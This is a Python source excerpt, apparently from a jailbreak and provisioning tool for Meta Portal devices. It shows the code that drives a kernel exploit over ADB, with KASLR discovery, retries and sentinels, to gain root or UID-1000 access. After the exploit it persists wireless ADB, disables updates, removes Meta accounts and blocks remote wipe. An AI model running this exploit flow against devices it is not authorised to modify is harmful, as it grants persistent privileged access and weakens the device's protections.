                hardware_class = META_HARDWARE_AUTHENTICATOR.split("/", 1)[1]
                if missing or hardware_class in disabled:
                    raise ProvisionError(
                        "Meta authenticator guard did not persist: "
                        f"missing_disabled={sorted(missing)} "
                        f"hardware_disabled={hardware_class in disabled} "
                        f"disabled={sorted(disabled)}"
                    )
                print("META_AUTHENTICATOR_GUARD_OK authenticators=disabled")
            elif self.meta_accounts_local_only:
                self.adb_run(
                    ["shell", "touch", META_ACCOUNT_LOCAL_CLEAN_REMOTE],
                    timeout=5,
                    check=True,
                )
                self.adb_run(
                    ["shell", "chmod", "0600", META_ACCOUNT_LOCAL_CLEAN_REMOTE],
                    timeout=5,
                    check=True,
                )
                accounts = self.meta_accounts()
                print(
                    "META_ACCOUNT_PACKAGE_CLEANUP_OK local_rows=0 "
                    f"system_records={len(accounts)}"
                )
            else:
                self.verify_meta_accounts_removed()
        # Start a newly installed Shizuku helper before the longer camera
        # checks. Android keeps freshly installed packages stopped until their
        # first explicit launch, so its BOOT_COMPLETED receiver cannot run yet.
        if self.shizuku:
            self.verify_shizuku()
        if self.remove_shizuku:
            self.verify_shizuku_removed()
        if (
            self.optimize_presence
            or self.presence_fps_cap is not None
            or self.restore_presence_fps
        ):
            self.verify_presence_runtime(
                require_profile=True,
                expected_analysis_fps=self.presence_fps_cap,
            )
        if self.restore_presence_profile:
            self.verify_presence_runtime(require_profile=False)
        if self.restore_presence_fps or self.restore_presence_profile:
            if self.adb_run(
                ["shell", "test", "-e", self.uid1000_path("presence-fps")],
                timeout=5,
            ).returncode == 0:
                raise ProvisionError("UID-1000 presence activation config remains")
        if self.privacy_dns or self.dhcp_dns or self.restore_privacy_dns:
            self.verify_privacy_dns()
        if self.allow_app_updates or self.restore_app_verifier:
            self.verify_app_verifier_setting()
        if self.system_theme_control is not None:
            self.verify_system_theme_control()
        if self.disable_camera_light:
            self.verify_camera_light_disabled()
        if self.restore_camera_light:
            self.verify_camera_light_restored()

    def verify_camera_light_disabled(self, wait_seconds: int = 35) -> None:
        return self.presence_feature.verify_camera_light_disabled(wait_seconds)

    def verify_camera_light_restored(self) -> None:
        return self.presence_feature.verify_camera_light_restored()

    def verify_across_two_reboots(self, first_boot: str | None = None) -> None:
        if first_boot is None:
            _, first_boot = self.reboot()
        self.verify_requested_state()
        second_boot = first_boot
        if self.verify_boots >= 2:
            print("VERIFY_REBOOT starting", flush=True)
            before, second_boot = self.reboot()
            if before != first_boot:
                raise ProvisionError(
                    f"unexpected boot changed before verification: "
                    f"{first_boot} -> {before}"
                )
            self.verify_requested_state()
        if self.persist_wireless_adb:
            property_name = (
                self.target.wireless_adb_file_property
                if self.target and self.target.wireless_adb_file_property
                else "persist.adb.tcp.port"
            )
            self.push_text_atomic(
                f"property={property_name}\nport=5555\n"
                f"first_boot={first_boot}\nsecond_boot={second_boot}\n",
                WIRELESS_ADB_INSTALLED_REMOTE,
            )
        if self.adb_framework_boot_install_requested():
            self.push_text_atomic(
                f"target={self.target.key if self.target else 'unknown'}\n"
                f"first_boot={first_boot}\nsecond_boot={second_boot}\n",
                ADB_FRAMEWORK_BOOT_INSTALLED_REMOTE,
            )
            self.adb_framework_boot_configured = True
            print(
                "ADB_FRAMEWORK_BOOT_OK persistence=uid1000 "
                "adb_enabled=1"
            )
        self.write_state("complete", first_boot, second_boot)
        print(
            f"PROVISION_OK first_boot={first_boot} second_boot={second_boot} "
            f"logs={self.log_dir}"
        )

    def run_standard_install(self, use_exploit_sentinel: bool) -> None:
        sentinel_removed = not use_exploit_sentinel
        try:
            self.prepare_exploit_users()
            self.stage()
            clean_boot_id: str | None = None
            for attempt in range(1, self.attempts + 1):
                if clean_boot_id is None:
                    print(f"INSTALL_ATTEMPT={attempt} preparing clean boot", flush=True)
                    _, boot_id = self.reboot()
                else:
                    boot_id = clean_boot_id
                    clean_boot_id = None
                    print(
                        f"INSTALL_ATTEMPT={attempt} using post-attempt clean boot "
                        f"boot_id={boot_id}",
                        flush=True,
                    )
                if self.target.address_discovery_settle_seconds:
                    print(
                        "ADDRESS_DISCOVERY_SETTLE "
                        f"seconds={self.target.address_discovery_settle_seconds}",
                        flush=True,
                    )
                    time.sleep(self.target.address_discovery_settle_seconds)
                try:
                    base = self.kaslr_base(str(attempt))
                    memstart = self.memstart(str(attempt))
                except ProvisionError as exc:
                    print(f"ADDRESS_DISCOVERY_RETRY attempt={attempt} error={exc}")
                    try:
                        self.connect(wait_seconds=600)
                        recovered_boot = self.adb_run(
                            [
                                "shell",
                                "cat",
                                "/proc/sys/kernel/random/boot_id",
                            ],
                            timeout=5,
                            check=True,
                        ).stdout.strip()
                        if recovered_boot:
                            clean_boot_id = recovered_boot
                            print(
                                "ADDRESS_DISCOVERY_RECOVERED "
                                f"boot_id={recovered_boot}",
                                flush=True,
                            )
                            if self.target.address_discovery_reboot_on_failure:
                                print(
                                    "ADDRESS_DISCOVERY_REBOOT "
                                    "reason=unusable-capture",
                                    flush=True,
                                )
                                _, clean_boot_id = self.reboot()
                    except ProvisionError as reconnect_error:
                        print(
                            "ADDRESS_DISCOVERY_RECONNECT_FAILED "
                            f"error={reconnect_error}",
                            flush=True,
                        )
                    continue
                print(
                    f"RUNTIME_ADDRESSES attempt={attempt} boot_id={boot_id} "
                    f"kaslr={base:#x} memstart={memstart:#x}",
                    flush=True,
                )
                exploit_ok = self.exploit(base, memstart, attempt)
                post_attempt_boot = self.connect_after_reboot(boot_id)
                if not exploit_ok:
                    clean_boot_id = post_attempt_boot
                    continue
                if use_exploit_sentinel:
                    self.uninstall_exploit_sentinel()
                    sentinel_removed = True
                if self.shizuku:
                    self.finalize_buffered_shizuku_key()
                if self.needs_uid1000_payload():
                    self.finalize_buffered_uid1000_markers()
                if (
                    self.system_theme_control is not None
                    and not self.system_theme_control_already_configured
                ):
                    self.apply_system_theme_request()
                if (
                    self.uid1000_runtime_package_installed
                    and not (
                        self.restore_camera_light
                        or self.restore_presence_fps
                        or self.restore_presence_profile
                    )
                ):
                    self.uid1000_runtime_package_installed = False
                    print("UID1000_RUNTIME_APK_RETAIN package=installed")
                if self.enable_updates:
                    self.enable_ota_packages()
                if self.remove_shizuku:
                    self.uninstall_shizuku_payload()
                if self.presence_fps_action_requested():
                    self.uninstall_presence_helper()
                if (
                    self.restore_camera_light
                    or self.restore_presence_fps
                    or self.restore_presence_profile
                ):
                    self.restore_uid1000_package_state_if_unused()
                self.verify_across_two_reboots(first_boot=post_attempt_boot)
                self.report_deferred_failures()
                return
        finally:
            if self.exploit_users_created:
                self.cleanup_exploit_users(best_effort=True)
            if use_exploit_sentinel and not sentinel_removed:
                self.uninstall_exploit_sentinel(best_effort=True)
            if self.uid1000_runtime_package_installed:
                self.uninstall_uid1000_runtime_payload(best_effort=True)
        raise ProvisionError(f"provisioning failed after {self.attempts} attempts")

    def provision(self) -> None:
        self.connect(wait_seconds=30)
        if self.status_only:
            # Read-only path: nothing reboots or races, so the
            # autoroot guard does not engage.
            self.verify_target(require_supported=False)
            self.print_status()
            if self.backup_path:
                self.create_backup_bundle(self.backup_path)
            return
        self._engage_autoroot_guard()
        try:
            self._provision_stages()
        except BaseException:
            self._release_autoroot_guard(succeeded=False)
            raise
        self._release_autoroot_guard(succeeded=True)

    def _provision_stages(self) -> None:
        resumed_pending = False
        if self.recover:
            self.verify_target(require_supported=False)
            if not self.recover_actions():
                return
            self.recover = False
            resumed_pending = True
        if self.dry_run:
            self.verify_target(require_supported=False)
            status = self.print_status()
            self.dry_run_report(status)
            if self.backup_path:
                self.create_backup_bundle(self.backup_path)
            return
        self.verify_target()
        self.adb_framework_boot_configured = (
            self.adb_framework_boot_preflight()
        )
        if self.system_theme_control is not None:
            self.system_theme_control_already_configured = (
                self.system_theme_control_preflight()
            )
            if (
                self.system_theme_control_already_configured
                and self.requested_actions()
                == {"system_theme_control": self.system_theme_control}
            ):
                self.write_state("complete")
                print(
                    "PROVISION_OK reboots=0 "
                    f"system_theme={self.system_theme_control} logs={self.log_dir}"
                )
                return
        if self.privileged_requested() and not self.skip_build:
            android_build_environment(self.target)
        # Resolve host-side downloads before any exploit bootstrap can reboot the
        # Portal. This turns a missing host network connection into an immediate,
        # actionable error instead of a late failure after several phases.
        if self.shizuku:
            self.resolve_shizuku_apk()
        if self.disable_camera_light:
            raise ProvisionError(
                "--disable-camera-light has been retired because Meta's "
                "camera provider rejects capture requests while its green "
                "indicator is cleared. This breaks detection, snapshots, "
                "and RTSP streaming. Use --restore-camera-light on devices "
                "that previously installed it."
            )
        legacy_camera_light = self.adb_run(
            ["shell", "test", "-f", CAMERA_LIGHT_INSTALLED_REMOTE],
            timeout=20,
        ).returncode == 0
        if not legacy_camera_light and not self.target.uid1000_embedded_helper:
            legacy_camera_light = self.adb_run(
                [
                    "shell",
                    "test",
                    "-e",
                    self.uid1000_path("camera-led-enabled"),
                ],
                timeout=20,
            ).returncode == 0
        if legacy_camera_light and not self.restore_camera_light:
            self.restore_camera_light = True
            print(
                "CAMERA_LIGHT_AUTO_RESTORE reason=camera-capture-incompatible",
                flush=True,
            )
        if (
            self.restore_camera_light
            and self.requested_actions() == {"restore_camera_light": True}
        ):
            try:
                self.verify_camera_light_restored()
            except ProvisionError:
                pass
            else:
                self.write_state("complete")
                print(
                    "PROVISION_ALREADY_COMPLETE actions=restore-camera-light "
                    f"logs={self.log_dir}"
                )
                self.report_deferred_failures()
                return
        if self.backup_path:
            self.create_backup_bundle(self.backup_path)
        persistent_property = (
            self.target.wireless_adb_file_property
            if self.target and self.target.wireless_adb_file_property
            else "persist.adb.tcp.port"
        )
        if self.target and self.target.wireless_adb_file_property:
            persistence_verified = self.adb_run(
                ["shell", "test", "-f", WIRELESS_ADB_INSTALLED_REMOTE],
                timeout=5,
            ).returncode == 0
            persistent_port = "5555" if persistence_verified else ""
        else:
            persistent_port = self.adb_run(
                ["shell", "getprop", persistent_property],
                timeout=5,
                check=True,
            ).stdout.strip()
        self.persist_wireless_adb = (
            not self.adb_framework_only
            and self.privileged_requested()
            and persistent_port != "5555"
        )
        if self.persist_wireless_adb:
            self.disable_adb_auth_timeout = True
            print(
                "STOCK_ADB_REENABLE_REQUIRED "
                f"property={persistent_property} persistent_port=unset\n"
                "Keep USB connected. After every reboot until the exploit "
                "reports WIRELESS_ADB_OK, enable ADB in the Portal's Debug "
                "menu and run `adb -d tcpip 5555` from another terminal. "
                "The provisioner waits up to 10 minutes for each reconnect.",
                flush=True,
            )
        if (
            self.persist_wireless_adb
            and self.target
            and self.target.audio_installer_credentials
            and not self.wireless_adb_only
            and not self.adb_framework_only
        ):
            phase_logs = self.log_dir / "wireless-adb-bootstrap"
            phase_logs.mkdir(parents=True, exist_ok=True)
            print(
                "WIRELESS_ADB_BOOTSTRAP_PHASE action=install "
                "reason=credential-specific-followup-actions",
                flush=True,
            )
            PortalProvisioner(
                self.serial,
                self.attempts,
                phase_logs,
                skip_build=self.skip_build,
                wireless_adb_only=True,
            ).provision()
            self.connect(wait_seconds=30)
            self.verify_target()
            persistent_port = self.adb_run(
                ["shell", "getprop", persistent_property],
                timeout=5,
                check=True,
            ).stdout.strip()
            if persistent_port != "5555":
                raise ProvisionError(
                    "the dedicated wireless ADB bootstrap did not verify: "
                    f"{persistent_property}={persistent_port!r}"
                )
            self.persist_wireless_adb = False
            print(
                "WIRELESS_ADB_BOOTSTRAP_OK persistent_port=5555 "
                f"property={persistent_property}",
                flush=True,
            )
        if (
            self.adb_framework_boot_install_requested()
            and self.target
            and self.target.uid1000_installer_credentials
            and not self.adb_framework_only
        ):
            phase_logs = self.log_dir / "adb-framework-bootstrap"
            phase_logs.mkdir(parents=True, exist_ok=True)
            print(
                "ADB_FRAMEWORK_BOOTSTRAP_PHASE action=install "
                "reason=installer-credential",
                flush=True,
            )
            PortalProvisioner(
                self.serial,
                self.attempts,
                phase_logs,
                skip_build=self.skip_build,
                adb_framework_only=True,
            ).provision()
            self.connect(wait_seconds=30)
            self.verify_target()
            self.adb_framework_boot_configured = (
                self.adb_framework_boot_preflight()
            )
            if not self.adb_framework_boot_configured:
                raise ProvisionError(
                    "the dedicated ADB framework boot bootstrap did not verify"
                )
        self.audio_already_configured = (
            self.audio_preflight() if self.audio else False
        )
        with self.bootstrap_guard("audio"):
            if (
                self.audio
                and not self.audio_already_configured
                and self.target
                and self.target.audio_installer_credentials
                and self.requested_actions() != {"audio": True}
            ):
                phase_logs = self.log_dir / "audio-bootstrap"
                phase_logs.mkdir(parents=True, exist_ok=True)
                print(
                    "AUDIO_BOOTSTRAP_PHASE action=install reason=installer-credential",
                    flush=True,
                )
                PortalProvisioner(
                    self.serial,
                    self.attempts,
                    phase_logs,
                    audio=True,
                    skip_build=self.skip_build,
                ).provision()
                self.connect(wait_seconds=30)
                self.verify_target()
                self.audio_already_configured = self.audio_preflight()
                if not self.audio_already_configured:
                    raise ProvisionError(
                        "the dedicated Aloha audio bootstrap did not verify"
                    )
        if (
            self.audio_already_configured
            and not self.persist_wireless_adb
            and self.requested_actions() == {"audio": True}
        ):
            if resumed_pending:
                self.write_state("complete")
            print(f"PROVISION_ALREADY_COMPLETE actions=audio logs={self.log_dir}")
            self.report_deferred_failures()
            return
        self.write_state("pending")
        self.ota_already_configured = (
            self.ota_preflight() if self.disable_updates else False
        )
        with self.bootstrap_guard("disable_updates"):
            if (
                self.disable_updates
                and not self.ota_already_configured
                and self.target
                and (
                    self.target.ota_installer_credentials
                    or self.target.ota_system_credentials
                    or self.target.ota_credential_process is not None
                )
                and self.requested_actions() != {"disable_updates": True}
            ):
                phase_logs = self.log_dir / "ota-bootstrap"
                phase_logs.mkdir(parents=True, exist_ok=True)
                print(
                    "OTA_BOOTSTRAP_PHASE action=install "
                    "reason=installer-credential",
                    flush=True,
                )
                PortalProvisioner(
                    self.serial,
                    self.attempts,
                    phase_logs,
                    disable_updates=True,
                    skip_build=self.skip_build,
                ).provision()
                self.connect(wait_seconds=30)
                self.verify_target()
                self.ota_already_configured = self.ota_preflight()
                if not self.ota_already_configured:
                    raise ProvisionError(
                        "the dedicated Aloha OTA bootstrap did not verify"
                    )
                self.write_state("pending")
        if (
            self.ota_already_configured
            and not self.persist_wireless_adb
            and self.requested_actions() == {"disable_updates": True}
        ):
            if resumed_pending:
                self.write_state("complete")
            print(
                f"PROVISION_ALREADY_COMPLETE actions=disable_updates "
                f"logs={self.log_dir}"
            )
            self.report_deferred_failures()
            return
        already_meta_clean = (
            self.meta_accounts_preflight() if self.remove_meta_accounts else False
        )
        self.meta_accounts_already_clean = already_meta_clean
        with self.bootstrap_guard("remove_meta_accounts"):
            if (
                self.remove_meta_accounts
                and not already_meta_clean
                and not self.meta_accounts_absent
                and self.target
                and self.target.meta_accounts_package_bootstrap
                and not self.meta_accounts_local_only
                and not self.meta_accounts_auth_only
                and not self.meta_accounts_finalize_only
            ):
                disabled = self.disabled_meta_authenticators()
                hardware_class = META_HARDWARE_AUTHENTICATOR.split("/", 1)[1]
                if (
                    set(META_AUTHENTICATOR_COMPONENTS) - disabled
                    or hardware_class in disabled
                ):
                    auth_logs = self.log_dir / "meta-accounts-auth-bootstrap"
                    auth_logs.mkdir(parents=True, exist_ok=True)
                    print(
                        "META_ACCOUNTS_AUTH_PHASE action=guard "
                        "reason=prevent-account-recreation",
                        flush=True,
                    )
                    PortalProvisioner(
                        self.serial,
                        self.attempts,
                        auth_logs,
                        remove_meta_accounts=True,
                        skip_build=self.skip_build,
                        meta_accounts_auth_only=True,
                    ).provision()
                    self.connect(wait_seconds=30)
                    self.verify_target()
                local_clean = (
                    self.adb_run(
                        ["shell", "test", "-f", META_ACCOUNT_LOCAL_CLEAN_REMOTE],
                        timeout=5,
                    ).returncode
                    == 0
                )
                if not local_clean:
                    phase_logs = self.log_dir / "meta-accounts-package-bootstrap"
                    phase_logs.mkdir(parents=True, exist_ok=True)
                    print(
                        "META_ACCOUNTS_PACKAGE_PHASE action=remove "
                        "reason=package-private-identity",
                        flush=True,
                    )
                    PortalProvisioner(
                        self.serial,
                        self.attempts,
                        phase_logs,
                        remove_meta_accounts=True,
                        skip_build=self.skip_build,
                        meta_accounts_local_only=True,
                    ).provision()
                    self.connect(wait_seconds=30)
                    self.verify_target()
                finalize_logs = self.log_dir / "meta-accounts-finalize-bootstrap"
                finalize_logs.mkdir(parents=True, exist_ok=True)
                print(
                    "META_ACCOUNTS_FINALIZE_PHASE action=remove "
                    "reason=system-account-records",
                    flush=True,
                )
                PortalProvisioner(
                    self.serial,
                    self.attempts,
                    finalize_logs,
                    remove_meta_accounts=True,
                    skip_build=self.skip_build,
                    meta_accounts_finalize_only=True,
                ).provision()
                self.connect(wait_seconds=30)
                self.verify_target()
                already_meta_clean = self.meta_accounts_preflight()
                self.meta_accounts_already_clean = already_meta_clean
                if not already_meta_clean:
                    raise ProvisionError(
                        "the dedicated Meta account cleanup phases did not verify"
                    )
                self.write_state("pending")
        with self.bootstrap_guard("remove_meta_accounts"):
            if (
                self.remove_meta_accounts
                and not already_meta_clean
                and self.target
                and self.target.meta_accounts_system_credentials
                and self.requested_actions() != {"remove_meta_accounts": True}
            ):
                phase_logs = self.log_dir / "meta-accounts-bootstrap"
                phase_logs.mkdir(parents=True, exist_ok=True)
                print(
                    "META_ACCOUNTS_BOOTSTRAP_PHASE action=remove "
                    "reason=system-server-credential",
                    flush=True,
                )
                PortalProvisioner(
                    self.serial,
                    self.attempts,
                    phase_logs,
                    remove_meta_accounts=True,
                    skip_build=self.skip_build,
                ).provision()
                self.connect(wait_seconds=30)
                self.verify_target()
                already_meta_clean = self.meta_accounts_preflight()
                self.meta_accounts_already_clean = already_meta_clean
                if not already_meta_clean:
                    raise ProvisionError(
                        "the dedicated Aloha Meta-account cleanup did not verify"
                    )
                self.write_state("pending")
        if (
            already_meta_clean
            and not self.persist_wireless_adb
            and not self.adb_framework_boot_install_requested()
            and self.requested_actions() == {"remove_meta_accounts": True}
        ):
            if resumed_pending:
                self.write_state("complete")
            print(
                f"PROVISION_ALREADY_COMPLETE actions=remove_meta_accounts "
                f"logs={self.log_dir}"
            )
            self.report_deferred_failures()
            return
        self.debloat_already_configured = (
            self.debloat_preflight() if self.debloat else False
        )
        with self.bootstrap_guard("debloat"):
            if (
                self.debloat
                and not self.debloat_already_configured
                and self.target
                and self.target.shell_root_package_actions
                and not self.only_component_actions_requested()
            ):
                phase_logs = self.log_dir / "debloat-bootstrap"
                phase_logs.mkdir(parents=True, exist_ok=True)
                print(
                    "DEBLOAT_BOOTSTRAP_PHASE action=install "
                    "reason=root-shell-credential",
                    flush=True,
                )
                PortalProvisioner(
                    self.serial,
                    self.attempts,
                    phase_logs,
                    debloat=True,
                    block_remote_wipe=self.block_remote_wipe,
                    skip_build=self.skip_build,
                ).provision()
                self.connect(wait_seconds=30)
                self.verify_target()
                self.debloat_already_configured = self.debloat_preflight()
                if not self.debloat_already_configured:
                    raise ProvisionError(
                        "the dedicated Aloha component debloat did not verify"
                    )
                self.write_state("pending")
        if (
            self.debloat_already_configured
            and not self.persist_wireless_adb
            and self.requested_actions() == {"debloat": True}
        ):
            if resumed_pending:
                self.write_state("complete")
            print(
                f"PROVISION_ALREADY_COMPLETE actions=debloat "
                f"logs={self.log_dir}"
            )
            self.report_deferred_failures()
            return
        self.remote_wipe_already_configured = (
            self.remote_wipe_preflight() if self.block_remote_wipe else False
        )
        with self.bootstrap_guard("block_remote_wipe"):
            if (
                self.block_remote_wipe
                and not self.remote_wipe_already_configured
                and self.target
                and self.target.shell_root_package_actions
                and not self.only_component_actions_requested()
            ):
                phase_logs = self.log_dir / "remote-wipe-bootstrap"
                phase_logs.mkdir(parents=True, exist_ok=True)
                print(
                    "REMOTE_WIPE_BOOTSTRAP_PHASE action=block "
                    "reason=root-shell-credential",
                    flush=True,
                )
                PortalProvisioner(
                    self.serial,
                    self.attempts,
                    phase_logs,
                    block_remote_wipe=True,
                    skip_build=self.skip_build,
                ).provision()
                self.connect(wait_seconds=30)
                self.verify_target()
                self.remote_wipe_already_configured = self.remote_wipe_preflight()
                if not self.remote_wipe_already_configured:
                    raise ProvisionError(
                        "the dedicated Aloha remote-wipe block did not verify"
                    )
                self.write_state("pending")
        if (
            self.remote_wipe_already_configured
            and not self.persist_wireless_adb
            and self.requested_actions() == {"block_remote_wipe": True}
        ):
            if resumed_pending:
                self.write_state("complete")
            print(
                "PROVISION_ALREADY_COMPLETE actions=block_remote_wipe "
                f"logs={self.log_dir}"
            )
            self.report_deferred_failures()
            return
        self.presence_already_configured = (
            self.presence_preflight() if self.optimize_presence else False
        )
        with self.bootstrap_guard("optimize_presence"):
            if (
                self.optimize_presence
                and not self.presence_already_configured
                and self.target
                and self.target.presence_installer_credentials
                and self.requested_actions() != {"optimize_presence": True}
            ):
                phase_logs = self.log_dir / "presence-bootstrap"
                phase_logs.mkdir(parents=True, exist_ok=True)
                print(
                    "PRESENCE_BOOTSTRAP_PHASE action=install "
                    "reason=installer-credential",
                    flush=True,
                )
                PortalProvisioner(
                    self.serial,
                    self.attempts,
                    phase_logs,
                    optimize_presence=True,
                    skip_build=self.skip_build,
                ).provision()
                self.connect(wait_seconds=30)
                self.verify_target()
                self.presence_already_configured = self.presence_preflight()
                if not self.presence_already_configured:
                    raise ProvisionError(
                        "the dedicated Aloha presence bootstrap did not verify"
                    )
                self.write_state("pending")
        if (
            self.presence_already_configured
            and not self.persist_wireless_adb
            and self.requested_actions() == {"optimize_presence": True}
        ):
            self.write_state("complete")
            print(
                f"PROVISION_ALREADY_COMPLETE actions=optimize_presence "
                f"logs={self.log_dir}"
            )
            self.report_deferred_failures()
            return
        self.presence_fps_already_configured = (
            self.presence_fps_preflight()
            if self.presence_fps_cap is not None
            else False
        )
        dedicated_presence_fps_actions = (
            {"presence_fps_cap": self.presence_fps_cap},
            {
                "optimize_presence": True,
                "presence_fps_cap": self.presence_fps_cap,
            },
        )
        with self.bootstrap_guard("presence_fps"):
            if (
                self.presence_fps_cap is not None
                and not self.presence_fps_already_configured
                and self.target
                and self.target.uid1000_installer_credentials
                and self.requested_actions() not in dedicated_presence_fps_actions
            ):
                phase_logs = self.log_dir / "presence-fps-bootstrap"
                phase_logs.mkdir(parents=True, exist_ok=True)
                print(
                    "PRESENCE_FPS_BOOTSTRAP_PHASE action=install "
                    "reason=installer-credential",
                    flush=True,
                )
                PortalProvisioner(
                    self.serial,
                    self.attempts,
                    phase_logs,
                    optimize_presence=True,
                    presence_fps_cap=self.presence_fps_cap,
                    skip_build=self.skip_build,
                ).provision()
                self.connect(wait_seconds=30)
                self.verify_target()
                self.presence_fps_already_configured = (
                    self.presence_fps_preflight()
                )
                if not self.presence_fps_already_configured:
                    raise ProvisionError(
                        "the dedicated Aloha presence FPS bootstrap did not verify"
                    )
                self.write_state("pending")
        if self.debloat and not self.debloat_already_configured:
            self.apply_debloat()
        if self.restore_bloat:
            self.restore_debloat()
        if self.block_remote_wipe and not self.remote_wipe_already_configured:
            self.ensure_remote_wipe_backup()
        if self.restore_remote_wipe:
            self.read_remote_wipe_backup(required=True)
        if self.needs_uid1000_payload():
            if self.skip_build:
                self.validate_uid1000_payload()
            self.prepare_camera_light_install()
        if self.disable_updates:
            self.disable_ota_packages()
        if self.disable_adb_auth_timeout:
            self.disable_adb_authorization_timeout()
        if self.restore_adb_auth_timeout:
            self.restore_adb_authorization_timeout()
        if self.privacy_dns:
            self.apply_privacy_dns()
        if self.dhcp_dns:
            self.apply_dhcp_dns()
        if self.restore_privacy_dns:
            self.restore_private_dns()
        if self.allow_app_updates:
            self.allow_third_party_app_updates()
        if self.restore_app_verifier:
            self.restore_app_verifier_setting()
        if self.needs_component_ctl():
            self.prepare_component_actions()

        privileged_action = (
            self.persist_wireless_adb
            or self.adb_framework_boot_install_requested()
            or (self.audio and not self.audio_already_configured)
            or self.restore_audio
            or (self.disable_updates and not self.ota_already_configured)
            or self.enable_updates
            or (self.debloat and not self.debloat_already_configured)
            or self.restore_bloat
            or (self.block_remote_wipe and not self.remote_wipe_already_configured)
            or self.restore_remote_wipe
            or (self.optimize_presence and not self.presence_already_configured)
            or self.restore_presence_profile
            or self.presence_fps_action_requested()
            or self.restore_presence_fps
            or (self.remove_meta_accounts and not already_meta_clean)
            or self.shizuku
            or self.remove_shizuku
            or self.disable_camera_light
            or self.restore_camera_light
            or self.custom_payload is not None
            or self.system_theme_uid1000_action_requested()
        )
        if not privileged_action:
            if set(self.requested_actions()) <= {
                "disable_adb_auth_timeout",
                "restore_adb_auth_timeout",
                "system_theme_control",
            }:
                self.verify_requested_state()
                self.write_state("complete")
                print(f"PROVISION_OK reboots=0 logs={self.log_dir}")
                self.report_deferred_failures()
                return
            self.verify_across_two_reboots()
            self.report_deferred_failures()
            return

        if not self.skip_build:
            build(
                target=self.target,
                build_audio=(
                    (self.audio and not self.audio_already_configured)
                    or self.restore_audio
                ),
                build_account=self.remove_meta_accounts,
                build_components=(
                    self.needs_component_ctl()
                ),
                build_shizuku=self.shizuku,
                build_autoroot=self.autoroot,
                build_presence=False,
                build_uid1000=self.needs_uid1000_payload(),
                build_sentinel=self.uses_exploit_sentinel(),
                build_daemon=(
                    self.custom_payload is not None
                    and self.custom_payload == DEFAULT_CUSTOM_PAYLOAD_LOCAL
                ),
            )
        if self.needs_uid1000_payload():
            self.validate_uid1000_payload()
        if self.shizuku:
            self.install_shizuku_payload()
        if (
            self.needs_uid1000_payload()
            and self.target.uid1000_embedded_helper
        ):
            self.install_uid1000_runtime_payload()
        if self.restore_presence_fps or self.restore_presence_profile:
            self.uninstall_presence_helper()
        use_exploit_sentinel = self.uses_exploit_sentinel()
        if use_exploit_sentinel:
            self.prepare_exploit_sentinel()
        sentinel_removed = not use_exploit_sentinel
        if self.custom_payload is not None and self.shizuku:
            # The helper ADB key authorization only takes effect as part
            # of the standard install loop's post-root actions; attempted
            # from the custom-payload phase it fails, which used to make
            # the payload phase discard otherwise-won attempts and left
            # the key unauthorized for later boots. Run the standard
            # install first so the key is authorized on the device, then
            # re-stage the sentinel the install loop removed and apply
            # the payload on the resulting boot.
            print("COMBINED_FLOW standard_install_first=1", flush=True)
            self.run_standard_install(use_exploit_sentinel)
            if use_exploit_sentinel:
                self.prepare_exploit_sentinel()
        if self.custom_payload is not None:
            try:
                self.apply_custom_payload()
            finally:
                if use_exploit_sentinel and not self.autoroot:
                    self.uninstall_exploit_sentinel(best_effort=True)
                    sentinel_removed = True
                elif use_exploit_sentinel:
                    print(
                        "EXPLOIT_SENTINEL_RETAINED reason=autoroot",
                        flush=True,
                    )
            return
        self.run_standard_install(use_exploit_sentinel)


def android_build_environment(
    target: PortalTarget | None = None,
) -> dict[str, str]:
    """Resolve and validate the per-user Android toolchain."""
    environment = dict(os.environ)

    sdk_value = environment.get("ANDROID_SDK_ROOT") or environment.get(
        "ANDROID_HOME"
    )
    if sdk_value:
        sdk = pathlib.Path(sdk_value).expanduser()
    else:
        sdk_candidates = (
            pathlib.Path.home() / "Android/Sdk",
            pathlib.Path.home() / "Android/sdk",
            pathlib.Path.home() / "android-sdk",
        )
        sdk = next(
            (candidate for candidate in sdk_candidates if candidate.is_dir()),
            sdk_candidates[0],
        )

    ndk_value = next(
        (
            environment[name]
            for name in ("NDK", "ANDROID_NDK_HOME", "ANDROID_NDK_ROOT")
            if environment.get(name)
        ),
        None,
    )
    ndk = (
        pathlib.Path(ndk_value).expanduser()
        if ndk_value
        else sdk / "ndk" / ANDROID_NDK_VERSION
    )
    build_tools = pathlib.Path(
        environment.get(
            "BUILD_TOOLS",
            str(sdk / "build-tools" / ANDROID_BUILD_TOOLS_VERSION),
        )
    ).expanduser()
    android_jar = pathlib.Path(
        environment.get(
            "ANDROID_JAR",
            str(sdk / "platforms" / ANDROID_PLATFORM_VERSION / "android.jar"),
        )
    ).expanduser()
    d8 = pathlib.Path(environment.get("D8", str(build_tools / "d8"))).expanduser()
    toolchain_bin = ndk / "toolchains/llvm/prebuilt/linux-x86_64/bin"

    required_paths = {
        "Android NDK arm64 compiler": (
            toolchain_bin / "aarch64-linux-android29-clang"
        ),
        "Android NDK ARM compiler (API 28)": (
            toolchain_bin / "armv7a-linux-androideabi28-clang"
        ),
        "Android NDK ARM compiler (API 29)": (
            toolchain_bin / "armv7a-linux-androideabi29-clang"
        ),
        "Android SDK Platform 36": android_jar,
        "Android Build Tools aapt": build_tools / "aapt",
        "Android Build Tools apksigner": build_tools / "apksigner",
        "Android Build Tools zipalign": build_tools / "zipalign",
        "Android Build Tools d8": d8,
    }
    if target and target.bundled_simpleperf:
        required_paths["Android NDK arm64 simpleperf"] = (
            ndk / "simpleperf/bin/android/arm64/simpleperf"
        )
    missing_paths = [
        f"{label}: {path}"
        for label, path in required_paths.items()
        if not path.is_file()
    ]
    missing_commands = [
        command
        for command in ("make", "javac", "jar", "keytool")
        if shutil.which(command) is None
    ]
    if missing_paths or missing_commands:
        details = missing_paths + [
            f"host command not found in PATH: {command}"
            for command in missing_commands
        ]
        raise ProvisionError(
            "Android build environment is incomplete; no Portal changes were "
            "made. Install the host requirements or set ANDROID_SDK_ROOT, NDK, "
            "ANDROID_JAR and BUILD_TOOLS as documented:\n- "
            + "\n- ".join(details)
        )

    environment.update(
        {
            "SDK": str(sdk),
            "ANDROID_SDK_ROOT": str(sdk),
            "NDK": str(ndk),
            "ANDROID_NDK_HOME": str(ndk),
            "BUILD_TOOLS": str(build_tools),
            "ANDROID_JAR": str(android_jar),
            "D8": str(d8),
        }
    )
    return environment


def build(
    target: PortalTarget | None,
    build_audio: bool,
    build_account: bool,
    build_components: bool,
    build_shizuku: bool,
    build_autoroot: bool,
    build_presence: bool,
    build_uid1000: bool,
    build_sentinel: bool,
    build_daemon: bool = False,
) -> None:
    if target is None:
        raise ProvisionError("target must be selected before building")
